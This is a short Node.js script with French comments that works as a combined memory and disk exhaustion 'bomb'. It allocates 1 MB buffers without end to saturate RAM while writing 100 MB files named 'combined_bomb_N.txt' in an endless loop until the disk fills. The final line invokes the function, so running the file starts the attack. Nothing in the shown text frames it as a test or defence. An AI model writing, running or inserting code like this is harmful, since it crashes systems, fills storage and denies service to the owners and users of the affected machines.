const fs = require('fs');
const path = require('path');

function consumeMemoryAndDisk(folderPath, fileSizeInMB = 50) {
    if (!fs.existsSync(folderPath)) {
        fs.mkdirSync(folderPath, { recursive: true });
    }

    const memoryArray = [];
    const largeData = Buffer.alloc(fileSizeInMB * 1024 * 1024, 'A'); // Crée un buffer rempli de 'A'
    let counter = 0;

    function allocateMemory() {
        memoryArray.push(Buffer.alloc(1024 * 1024, 'A')); // Alloue 1 Mo
        console.log(`Memory allocated: ${memoryArray.length} MB`);
        setImmediate(allocateMemory); // Continue d'allouer
    }

    function writeFile() {
        const fileName = path.join(folderPath, `combined_bomb_${counter}.txt`);
        fs.writeFileSync(fileName, largeData);
        console.log(`Created file: ${fileName}`);
        counter++;
        setImmediate(writeFile); // Continue jusqu'à remplir le disque
    }

    // Lancer simultanément les deux fonctions
    allocateMemory();
    writeFile();
}

// Appeler la fonction
consumeMemoryAndDisk('./combined_bomb', 100); // Crée des fichiers de 100 Mo tout en saturant la RAM
